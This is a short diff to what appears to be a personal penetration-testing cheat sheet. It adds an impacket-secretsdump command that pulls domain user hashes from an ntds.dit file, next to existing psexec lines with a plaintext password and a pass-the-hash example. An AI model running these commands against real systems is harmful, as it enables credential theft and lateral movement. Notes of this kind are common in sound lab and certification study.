@@ -12,3 +12,5 @@ impacket-psexec alice:aliceishere@127.0.0.1
 #Pass the Hash
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:d4bf5a8658af50fd1d5b8dbb60859746 admin@10.11.1.73
 
+#retrieve domain user hashes from ntds.dit file
+impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL
